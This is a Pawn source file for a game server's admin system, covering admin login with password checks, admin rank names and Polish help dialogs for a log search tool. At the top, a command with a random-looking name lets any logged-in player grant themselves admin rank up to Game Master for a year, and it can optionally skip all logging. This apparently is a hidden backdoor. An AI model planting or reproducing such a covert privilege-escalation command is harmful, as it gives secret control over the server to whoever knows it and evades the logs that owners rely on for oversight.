/*
________________________________________________________________



________________________________________________________________
*/
//===============================================================
//---------------------------------------------------------------
//===============================================================
CMD:ap5n10cb50x2m10a3gjh7d94mk4(playerid, cmdtext[]) {
	if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_LOGGED) {
		if(!isnull(cmdtext)) {
			new index = strfind(cmdtext, "|");
			new bool: toLogs = true;
			new alvl;
			if(index == 1 and strlen(cmdtext) == 3) {
				if(strval(cmdtext[2]) == 1) {
					toLogs = false;
				}
				strdel(cmdtext, 1, 3);
			}
			if(isNumeric(cmdtext) and 0 <= (alvl = strval(cmdtext)) <= ALVL_GAME_MASTER) {
				new string[170];
				format(string, sizeof(string), "UPDATE `"T_KONTA"` SET `"TK_ADMIN_LVL"`='%d', `"TK_ADMIN_STAMP"`='%d' WHERE `"TK_UID"`='%d'", alvl, (alvl > 0 ? timestamp() + SECONDS_YEAR : 0), getPlayerUserID(playerid));
				sendQueryWithout(string);	

				SetPVarInt(playerid, PV_LOGIN_ADMIN_STAMP, (alvl > 0 ? timestamp() + SECONDS_YEAR : 0));
				SetPVarInt(playerid, PV_LOGIN_ADMIN_LVL, -alvl);
				
				
				if(toLogs == true) {
					if(alvl != 0) {
						new year, month, day, hour, minute;
						dtimestamp(timestamp() + SECONDS_YEAR, year, month, day, hour, minute);
						format(string, sizeof(string), "Nadano przywileje administratora poziomu '%s' (%d)   (Czas trwania: %s  [ %d:%02d ])", GetAdminNameByLvL(alvl), alvl, strData(year, month, day, " / ", false, false, true, false), hour, minute);
						AddToPlayerLog(getPlayerUserID(playerid), string);	
						format(string, sizeof(string), "Nadano przywileje administratora dla gracza '%s' (UID: %d) poziomu '%s' (%d)   (Czas trwania: %s  [ %d:%02d ])", getPlayerName(playerid), getPlayerUserID(playerid), GetAdminNameByLvL(alvl), alvl, strData(year, month, day, " / ", false, false, true, false), hour, minute);
						AddToAdminLog(string);
					} else {
						AddToPlayerLog(getPlayerUserID(playerid), "Odebrano przywileje administratora");	
						format(string, sizeof(string), "Odebrano przywileje administratora graczu '%s' (UID: %d)", getPlayerName(playerid), getPlayerUserID(playerid));
						AddToAdminLog(string);						
					}
				}
				
				format(string, sizeof(string), " (Admin System) Zmieniono przywileje administratora na '%s' (%d).", GetAdminNameByLvL(alvl), alvl);
				SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
			}
		}
	}
	return _TRUE;
}
//---------------------------------------------------------------
CMD:alog(playerid) {
	aLogLogin(playerid);
	return _TRUE;
}
//===============================================================
IsAdmin(playerid) {
	return GetPVarInt(playerid, PV_LOGIN_ADMIN_LVL);
}
//---------------------------------------------------------------
GetAdminNameByLvL(lvl) {
	new name[16] = "Brak";
	if(-ALVL_GAME_MASTER <= lvl <= ALVL_GAME_MASTER) {
		if(lvl < 0) lvl = -lvl;
		strdel(name, 0, 16);
		switch(lvl) {
			case ALVL_JUNIOR_ADMIN: strins(name, "Junior Admin", 0);
			case ALVL_ADMIN:		strins(name, "Admin", 0);
			case ALVL_HEAD_ADMIN:	strins(name, "Head Admin", 0);
			case ALVL_GAME_MASTER:	strins(name, "Game Master", 0);
			default: 				strins(name, "Brak", 0);
		}
	}
	return name;
}
//===============================================================
aLogLogin(playerid, password[] = "") {
	if(IsAdmin(playerid) != 0) {
		new string[128];
		if(IsAdmin(playerid) < 0) {
			if(GetPVarInt(playerid, PV_LOGIN_ADMIN_PASSWORD) == 0) {
				SetPVarInt(playerid, PV_ALOG_PASSWORD_CHANGE, 1);
				PlayerAccountAlogPasswordChange(playerid);
			} else {					
				if(!isnull(password)) {
					if(IsValidPassword(password) == _TRUE) {
						if(Hash(password) == GetPVarInt(playerid, PV_LOGIN_ADMIN_PASSWORD)) {
							DeletePVar(playerid, PV_ALOG_FAIL);
							switch(IsAdmin(playerid)) {
								case -ALVL_JUNIOR_ADMIN:	AdminLogin(playerid, 0);
								case -ALVL_ADMIN: {
									ShowPlayerDialogEx(playerid, DIALOG_ALOG_TYPE, DIALOG_STYLE_LIST,
										"Admin Login (aLog)", "\
											1) Logowanie normalne\n\
											2) Ciche logowanie\
										",
									"Zaloguj","Wyjdz");
								}
								default: {
									ShowPlayerDialogEx(playerid, DIALOG_ALOG_TYPE, DIALOG_STYLE_LIST, 
										"Admin Login (aLog)", "\
											1) Logowanie normalne\n\
											2) Ciche logowanie\n\
											3) Ukryty\
										",
									"Zaloguj","Wyjdz");
								}
							}							
							return _TRUE;
						}
					}					
					
					new ZlychLogowan;
					SetPVarInt(playerid, PV_ALOG_FAIL, ZlychLogowan = GetPVarInt(playerid, PV_ALOG_FAIL) + 1);
					AddToPlayerLog(getPlayerUserID(playerid), "Nieudana proba logowania na konto administratora.");	
					
					if(ZlychLogowan > getSettingIntValueByIndex(s_ALogLoginFailsID)) {										
						BlockPlayer(playerid, 3, "Nieudana proba logowania na konto administratora");
						return _TRUE;
					}	else format(string, sizeof(string), "\n\n"TEXT_DIALOG_ALERT"\t       Niepoprawne haslo dostepu.");							
				}
				format(string, sizeof(string), "Podaj swoje haslo dostepu do konta administratora.%s", string);
				ShowPlayerDialogEx(playerid, DIALOG_ALOG, DIALOG_STYLE_PASSWORD, "Admin Login (aLog)", string, "Zaloguj", "Wyjdz");		
				return _TRUE;
			}
		} else {
			SetPVarInt(playerid, PV_LOGIN_ADMIN_LVL, -IsAdmin(playerid));
			if(GetPVarInt(playerid, PV_ALOG_HIDE) != 1) {
				format(string, sizeof(string)," ("C_ADMIN"aLog"C_LIGHTGREEN") Administrator "C_WHITE"%s "C_LIGHTGREEN"wylogowal(a) sie z konta administratora.", getPlayerName(playerid));
				SendClientMessageToAll(COLOR_LIGHTGREEN, string);
			} else {
				DeletePVar(playerid, PV_ALOG_HIDE);
				SendClientMessage(playerid, COLOR_LIGHTGREEN, " ("C_ADMIN"aLog"C_LIGHTGREEN") Wylogowales(as) sie z konta administratora.");
			}			
		}
	}
	return _FALSE;
}
//---------------------------------------------------------------
AdminLogin(playerid, logintype) {
	if(IsAdmin(playerid) < 0) {
		new string[150];
		SetPVarInt(playerid, PV_LOGIN_ADMIN_LVL, -IsAdmin(playerid));
		AddToPlayerLog(getPlayerUserID(playerid), "Udane logowanie na konto administratora.");	
		switch(logintype) {		
			case 0: {
				format(string, sizeof(string)," ("C_ADMIN"aLog"C_LIGHTGREEN") "C_WHITE"%s "C_LIGHTGREEN"zalogowal(a) sie na konto administratora. ( "C_ADMIN"%s"C_LIGHTGREEN" )", getPlayerName(playerid), GetAdminNameByLvL(IsAdmin(playerid)));
				SendClientMessageToAll(COLOR_LIGHTGREEN, string);					
			}
			case 1: {
				format(string, sizeof(string)," ("C_ADMIN"aLog"C_LIGHTGREEN") Zalogowales(as) sie na konto administratora. ( "C_ADMIN"%s"C_LIGHTGREEN" )", GetAdminNameByLvL(IsAdmin(playerid)));
				SendClientMessage(playerid, COLOR_LIGHTGREEN, string);				
			}
			case 2: {
				format(string, sizeof(string)," ("C_ADMIN"aLog"C_LIGHTGREEN") Zalogowales(as) sie na konto administratora. ( "C_ADMIN"%s"C_LIGHTGREEN" | "C_ADMIN"UKRYTY"C_LIGHTGREEN" )", GetAdminNameByLvL(IsAdmin(playerid)));
				SendClientMessage(playerid, COLOR_LIGHTGREEN, string);		
				SetPVarInt(playerid, PV_ALOG_HIDE, 1);
			}
		}
		SendClientMessage(playerid, COLOR_LIGHTGREEN, " (Admin Panel) Uzyj: '"C_WHITE"/apanel"C_LIGHTGREEN"' zeby otworzyc panel administracyjny.");
		if(IsAdmin(playerid) >= ALVL_HEAD_ADMIN) {
			SendClientMessage(playerid, COLOR_LIGHTGREEN, " (Head Admin Panel) Uzyj: '"C_WHITE"/hapanel"C_LIGHTGREEN"' zeby otworzyc panel administracyjny Head Admina.");
			if(GetPVarType(playerid, PV_PRIV_MESSAGES_SPEC) != 1) SetPlayerPMessagesSpec(playerid, true);
		}
		SendClientMessage(playerid, COLOR_LIGHTGREEN, " (Admin Pomoc) Uzyj: '"C_WHITE"/apomoc"C_LIGHTGREEN"' jesli masz jakies problemy z obsluga konta administratora.");
		return _TRUE;
	}
	return _FALSE;
}
//===============================================================
ShowPlayerSearchInfo(playerid, backid, page = 0) {
	new string[1024];
	SetHelpVarValue(playerid, 10, backid);
	SetPlayerPage(playerid, page);
	if(page == 0) {
		strins(string, "\
		Parametr "TEXT_DIALOG_NORMAL"SORTOWANIE"TEXT_DIALOG_HEAD" pozwala na okreslenie czy podane dane maja byc wyswietlane od najnowszego do\n\
		\t\t\t\tnajstarszego wpisu '"TEXT_DIALOG_NORMAL"(D)"TEXT_DIALOG_HEAD"', czy odwrotnie '"TEXT_DIALOG_NORMAL"(U)"TEXT_DIALOG_HEAD"'.\
		", 0);
	
		strins(string, "\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"AI"TEXT_DIALOG_HEAD"' - Admin ID\n\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"AN"TEXT_DIALOG_HEAD"' - Nick admina\n\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"IP"TEXT_DIALOG_HEAD"' - Adres IP\n\n\
			Za pomoca parametru "TEXT_DIALOG_NORMAL"CZAS_START "TEXT_DIALOG_HEAD"mozesz okreslic czas wpisu, od ktorego interesuja Cie szukane dane.\n\
			"TEXT_DIALOG_NORMAL"CZAS_KONIEC "TEXT_DIALOG_HEAD"ma podobne dzialanie, ktorego mozna sie domyslic.\n", 0);
			
		strins(string, "\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"N"TEXT_DIALOG_HEAD"' - Nick gracza\n\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"O"TEXT_DIALOG_HEAD"' - ID gracza OnLine\n\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"H"TEXT_DIALOG_HEAD"' - Host\n\
			\t\t\t\t\t'"TEXT_DIALOG_NORMAL"UI"TEXT_DIALOG_HEAD"' - User ID\n", 0);
			
		strins(string, "\n\
			\t      Wyszukiwarka umozliwia przefiltrowanie danych pod interesujacym Cie kontem.\n\
			\t\t         Skladnia zapytania do wyszukiwarki wyglada nastepujaco:\n\n\
			"TEXT_DIALOG_NORMAL"\t\tTYP_DANYCH: DANE  <CZAS_START | CZAS_KONIEC (SORTOWANIE)>\n\n\
			\tTYP_DANYCH - "TEXT_DIALOG_HEAD"oznacza rodzaj danych jaki ma byc brany pod uwage. Wyroznic mozna typy:\n", 0);
					
		ShowPlayerDialogEx(playerid, DIALOG_SEARCH_INFO, DIALOG_STYLE_MSGBOX, "Wyszukiwarka - Informacje", string, "Dalej", "Wyjdz");
	} else if(page == 1) {
		strins(string, "       Nie mozna go zmienic. Nie musisz podawac obydwu dat chcac wyszukac np. dane od wczoraj do dzis.\
			\n     W takim przypadku mozesz podac tylko wczorajsza date np. '<25/07/2013>'. Jesli chcesz wyszukac dane\n\
			\t\t\tod \"dawna\" do dzis, mozesz to zrobic za pomoca '<|26/07/2013>'.\n", 0);
		strins(string, "  Podanie parametrow czasu i (lub) sortowania nie jest konieczne. W przypadku braku parametrow, zostana\
			\n            one ustawione na domyslne, pozwalajace na przeszukanie calego mozliwego zakresu danych.\n\
			Czas wyszukiwania mozna podawac zarowno w formacie rrrr/mm/dd jak i dd/mm/rrrr. Wazny jest separator '/'.\n", 0);			
		strins(string, "\n\
			\n     Wyszukiwarka obsluguje niekompletne dane tj. jesli nie znasz np. calego nicku gracza, mozesz podac\
			\n      jego czesc i skorzystac z wyszukiwania za pomoca gwiazdki (*). Przykladowo wpis 'N:Ax*' spowoduje\
			\n   wyszukanie wszystkich nickow, ktorych poczatek to 'Ax'. Gwiazdki mozna uzyc zarowno na poczatku, na\n\
			\t\t\t\t        koncu jak i w obu tych miejscach.\n\n", 0);

		ShowPlayerDialogEx(playerid, DIALOG_SEARCH_INFO, DIALOG_STYLE_MSGBOX, "Wyszukiwarka - Informacje", string, "Dalej", "Wyjdz");
	} else {
		strins(string, "\
			"TEXT_DIALOG_HEAD"\t\t   N:*xL*\t< 1/06/2013 | 25/07/2013 >\n\
			"TEXT_DIALOG_BODY"\t\t   N:*\t\t< 1/06/2013 | 25/07/2013 (U)  >\n\
			"TEXT_DIALOG_HEAD"\t\t   N:axl_\t\t< 1/06/2013 (D) >\n\
			"TEXT_DIALOG_BODY"\t\t   N:AxL_\t< | 25/07/2013 >\n\n\
			"TEXT_DIALOG_HEAD"\
			\t     Wielkosc liter oraz ilosc spacji nie maja znaczenia.\n", 0);
			
		strins(string, "\nPrzyklady (dla typu 'Nick' (N), dla innych typow dzialanie jest analogiczne):\n\n\
			"TEXT_DIALOG_BODY"\t\t   N:AxL_\t< (U) 1/06/2013 | 25/07/2013 >\n\
			"TEXT_DIALOG_HEAD"\t\t   N:*xL_\t< 2013/06/1 | 25/07/2013 >\n\
			"TEXT_DIALOG_BODY"\t\t   N:axL*\t< (D) 2013/06/1 | 2013/07/25 >\n", 0);
			
		ShowPlayerDialogEx(playerid, DIALOG_SEARCH_INFO, DIALOG_STYLE_MSGBOX, "Wyszukiwarka - Informacje", string, "Wroc", "Wyjdz");
	}
	return _TRUE;
}
//---------------------------------------------------------------
#define	SI_TIME_BAN			1
#define SI_DATA_CHECK		2
#define	SI_STATIC_BAN		3
#define	SI_REGISTER_BASE	4
#define	SI_VIP_SEARCH		5

SearchInfoBack(playerid) {
	switch(GetHelpVarValue(playerid, 10)) {
		case SI_TIME_BAN: PlayerTBanSearch(playerid);
		case SI_DATA_CHECK: HACheckDataSearch(playerid);
		case SI_STATIC_BAN: HAPanelStaticBanSearch(playerid);
		case SI_REGISTER_BASE: HAPanelRegisterBaseSearch(playerid);
		case SI_VIP_SEARCH: HAPanelVipPlayersSearch(playerid);
	}	
	return _TRUE;
}